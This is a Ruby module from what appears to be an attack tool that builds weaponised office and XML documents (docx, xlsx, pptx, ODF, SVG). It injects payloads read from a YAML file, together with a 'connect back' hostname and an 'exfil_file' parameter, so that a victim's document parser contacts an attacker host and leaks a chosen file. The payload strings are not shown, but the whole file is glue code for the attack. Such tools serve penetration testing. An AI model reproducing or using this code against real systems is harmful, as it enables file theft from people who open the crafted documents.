# encoding: ASCII-8BIT
require_relative 'util'
require 'rubygems'
require 'json'
require 'fileutils'
require 'optparse'
require 'json'
require 'sequel'
require 'yaml'

# This moves most of the code that "does stuff" into one page
#    to allow for a api and cli version.

def read_payloads()
  data = YAML.load_file('payloads.yaml')

  payloads = {}
  data.each do |entry|
    name = entry['name']
    long = entry['long']
    payload = entry['payload']
    description = entry['description']
    payloads[name] = [payload, description]
  end
  return payloads
end

def oxml_file_defaults()
  d = {}
  d["docx"] = ["samples/sample.docx", "word/document.xml"]
  d["xlsx"] = ["samples/sample.xlsx", "xl/workbook.xml"]
  d["pptx"] = ["samples/sample.pptx", "ppt/presentation.xml"]
  d["odt"] =  ["samples/sample.odt", "content.xml"]
  d["odg"] =  ["samples/sample.odg", "content.xml"]
  d["odp"] =  ["samples/sample.odp", "content.xml"]
  d["ods"] =  ["samples/sample.ods", "content.xml"]

  return d
end

def build_file(params)
  # proto (required): protocol on connect back
  # hostname (required): hostname to connect to
  # file (required): the file to write
  # file_type
  # xml_file
  #
  oxmls = oxml_file_defaults()
  pl = read_payloads()

  if params["proto"] == "none"
    ip = params["hostname"]
  else
    # TODO is this correct for all protocols?
    ip = params["proto"]+"://"+params["hostname"]
  end

  if params[:file] != nil
    # TODO support svg
    # TODO support xml
    input_file = params[:file][:tempfile].read
    nname = "temp_#{Time.now.to_i}_"
    ext = params[:file][:filename].split('.').last
    rand_file = "./output/#{nname}_z.#{ext}"
    File.open(rand_file, 'wb') {|f| f.write(input_file) }
    file_exploit = rand_file
  end

  if oxmls.include?(params["file_type"])
    xml_file = params["xml_file"].size > 0 ? params["xml_file"] : oxmls[params["file_type"]][1]
    file_exploit = oxmls[params["file_type"]][0]
    fn = insert_payload_docx(file_exploit,xml_file,pl[params["payload"]][0],ip,params["exfil_file"])
  elsif params["file_type"] == "svg"
    fn = insert_payload_svg("./samples/sample.svg",pl[params["payload"]][0],ip,params["exfil_file"])
  elsif params["file_type"] == "xml"
    fn = insert_payload_xml("./samples/sample.xml",pl[params["payload"]][0],ip,params["exfil_file"])
  end

  return fn
end

def replace_file(params)
  # proto (required): protocol on connect back
  # hostname (required): hostname to connect to
  # file (required): the file to write
  # payload (required):
  # file_type (required):
  # xml_file (required):

  if params[:file] == nil
    return StandardError, "Error no file included"
  end

  pl = read_payloads()

  if params["proto"] == "none"
    ip = params["hostname"]
  else
    # TODO is this correct for all protocols
    ip = params["proto"]+"://"+params["hostname"]
  end

  input_file = params[:file][:tempfile].read
  nname = "temp_#{Time.now.to_i}_"
  ext = params[:file][:filename].split('.').last
  rand_file = "./output/#{nname}_z.#{ext}"
  File.open(rand_file, 'wb') {|f| f.write(input_file) }

  # TODO logic check if svg or xml
  # TODO modify uri

  fn = string_replace(pl[params["payload"]][0],rand_file,ip,params["exfil_file"])

  if fn == "|-|"
    raise StandardError, "Error: Could not find § in document, please verify."
  end

  return fn
end

def overwrite_xml(params)
  # proto (required): protocol on connect back
  # hostname (required): hostname to connect to
  # file (required): the file to write
  # payload (required):
  # file_type (required):
  # xml_file (required):

  if params[:file] == nil
    raise StandardError, "Error: No file to overwrite provided"
  end
  if params[:xml_file] == nil
    # Todo: allow the user to randomize this
    raise StandardError, "Error: No xml_file inside of the file to overwrite provided"
  end

  input_file = params[:file][:tempfile].read
  nname = "temp_#{Time.now.to_i}_"
  ext = params[:file][:filename].split('.').last
  rand_file = "./output/#{nname}_z.#{ext}"
  File.open(rand_file, 'wb') {|f| f.write(input_file) }

  if params[:replace_file] != nil
    contents = params[:replace_file][:tempfile].read
  else
    contents = params[:xml_content]
  end
  fn = insert_payload_docx_(rand_file,params["xml_file"],contents,'','',true)

  return fn
end
